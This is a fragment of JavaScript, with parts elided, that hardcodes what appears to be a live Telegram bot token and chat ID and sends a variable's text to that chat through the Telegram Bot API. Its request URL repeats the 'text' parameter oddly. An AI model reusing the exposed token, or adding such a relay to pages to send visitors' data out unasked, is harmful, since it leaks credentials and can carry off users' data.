var tokenBot = '1940508405:AAEWrdw8aISVfTYhh8RVdSaiiFiMiz8VYgs'; // Your "tokenBot" Here
var chatId = '867175498'; // Your "chatId" Here
...
function telegramSend(tokenBot, chatId) {
    ...
    xhr.open('GET', 'https://api.telegram.org/bot1940508405:AAEWrdw8aISVfTYhh8RVdSaiiFiMiz8VYgs/sendmessage?chat_id=867175498&text=' + chatId + '&text=' + textData + '&parse_mode=html', true);
    xhr.send();
}
